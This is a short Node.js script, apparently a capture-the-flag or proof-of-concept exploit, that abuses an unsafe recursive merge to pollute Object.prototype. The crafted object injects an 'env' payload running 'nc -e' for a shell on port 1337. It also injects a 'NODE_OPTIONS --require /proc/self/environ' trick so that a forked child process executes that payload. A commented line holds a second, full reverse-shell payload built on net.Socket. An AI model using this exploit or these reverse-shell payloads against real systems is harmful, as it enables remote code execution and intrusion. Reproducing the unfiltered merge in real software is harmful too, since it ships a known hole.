const { execSync, fork } = require("child_process");

function isObject(obj) {
  return typeof obj === "function" || typeof obj === "object";
}

function merge(target, source) {
  for (let key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

function clone(target) {
  return merge({}, target);
}

// let obj = {
//   name: "hello",
//   constructor: {
//     prototype: {
//       toString: function () {
//         console.log("test");
//         return 1111;
//       },
//       valueOf: function () {
//         console.log("test");
//         return 2222;
//       },
//     },
//   },
// };
//

let obj = {
  username: "Cat",
  constructor: {
    prototype: {
      env: {
        EVIL: "console.log(require('child_process').execSync('nc -e \"echo pwned && sh\" 127.0.0.1 1337').toString())//",
      },
      NODE_OPTIONS: "--require /proc/self/environ",
    },
  },
};
// EVIL: "console.log((function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('sh', []);var client = new net.Socket();client.connect(1337, '127.0.0.1', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}));",

clone(obj);

let newObj = {};

let proc = fork("VersionCheck.js", [], {
  stdio: ["ignore", "pipe", "pipe", "ipc"],
});
